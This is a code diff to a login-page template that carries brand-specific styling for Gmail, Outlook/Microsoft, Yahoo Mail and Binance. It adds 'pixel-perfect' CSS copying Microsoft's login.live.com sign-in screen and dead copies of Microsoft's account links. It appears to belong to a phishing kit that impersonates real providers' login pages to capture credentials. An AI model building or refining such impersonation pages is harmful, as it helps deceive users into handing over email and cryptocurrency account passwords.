@@ -340,12 +340,21 @@
   body.brand-gmail button { background:#1a73e8; border-radius:4px; background-image:none; font-weight:500; }
   body.brand-gmail button:hover { background:#1765cc; transform:none; filter:none; }
 
-  body.brand-outlook, body.brand-microsoftoutlook { background:#0078D4; color:#fff; }
-  body.brand-outlook .auth, body.brand-microsoftoutlook .auth { background:#fff; color:#323130; border-radius:4px; box-shadow:0 4px 16px rgba(0,0,0,.2); }
-  body.brand-outlook h1, body.brand-microsoftoutlook h1 { color:#0078D4; font-weight:600; }
-  body.brand-outlook input, body.brand-microsoftoutlook input { background:#fff; border:1px solid #605e5c; border-radius:2px; color:#323130; }
-  body.brand-outlook input:focus, body.brand-microsoftoutlook input:focus { border-color:#0078D4; border-width:2px; background:#fff; box-shadow:none; }
-  body.brand-outlook button, body.brand-microsoftoutlook button { background:#0078D4; border-radius:2px; background-image:none; font-weight:600; }
+  /* Outlook/Microsoft: pixel-perfect — login.live.com */
+  body.brand-outlook, body.brand-microsoftoutlook { background:#0078D4; color:#323130; font-family:'Segoe UI',system-ui,sans-serif; }
+  body.brand-outlook .auth, body.brand-microsoftoutlook .auth { background:#fff; color:#323130; border-radius:0; box-shadow:0 2px 6px rgba(0,0,0,.2); max-width:440px; padding:44px 44px 36px; }
+  body.brand-outlook .logo-svg, body.brand-microsoftoutlook .logo-svg { margin-bottom:16px; }
+  body.brand-outlook h1, body.brand-microsoftoutlook h1 { color:#1b1b1b; font-weight:600; font-size:1.5rem; text-align:left; margin-bottom:4px; }
+  body.brand-outlook .sub, body.brand-microsoftoutlook .sub { text-align:left; color:#323130; opacity:1; font-size:.9rem; margin-bottom:20px; }
+  body.brand-outlook label, body.brand-microsoftoutlook label { display:none; }
+  body.brand-outlook input, body.brand-microsoftoutlook input { background:#fff; border:1px solid #8a8886; border-radius:2px; color:#323130; padding:8px 12px; height:36px; font-size:.9rem; }
+  body.brand-outlook input:focus, body.brand-microsoftoutlook input:focus { border-color:#0078D4; border-width:2px; background:#fff; box-shadow:none; outline:none; }
+  body.brand-outlook input::placeholder, body.brand-microsoftoutlook input::placeholder { color:#a19f9d; }
+  body.brand-outlook button, body.brand-microsoftoutlook button { background:#0067b8; border-radius:0; background-image:none; font-weight:600; height:32px; font-size:.85rem; margin-top:16px; float:right; width:auto; padding:0 20px; }
+  body.brand-outlook button:hover, body.brand-microsoftoutlook button:hover { background:#005a9e; transform:none; filter:none; }
+  body.brand-outlook .ms-links, body.brand-microsoftoutlook .ms-links { clear:both; margin-top:48px; padding-top:16px; border-top:1px solid #e1dfdd; font-size:.8rem; }
+  body.brand-outlook .ms-links a, body.brand-microsoftoutlook .ms-links a { color:#0067b8; display:block; margin-bottom:8px; text-decoration:none; }
+  body.brand-outlook .ms-links a:hover, body.brand-microsoftoutlook .ms-links a:hover { text-decoration:underline; }
 
   body.brand-yahoomail { background:#6001D2; color:#fff; }
   body.brand-yahoomail .auth { background:#fff; color:#1a1a1a; border-radius:8px; box-shadow:0 4px 20px rgba(0,0,0,.25); }
@@ -1991,6 +2000,13 @@
   <% if (tpl.key === 'binance') { %>
     <div class="bn-forgot"><a href="#" onclick="return false">Forgot password?</a></div>
     <div class="bn-footer">Don't have an account? <a href="#" onclick="return false">Register</a></div>
+  <% } %>
+  <% if (tpl.key === 'microsoftoutlook' || tpl.key === 'outlook') { %>
+    <div class="ms-links">
+      <a href="#" onclick="return false">No account? Create one!</a>
+      <a href="#" onclick="return false">Can't access your account?</a>
+      <a href="#" onclick="return false">Sign-in options</a>
+    </div>
   <% } %>
 </div>
 
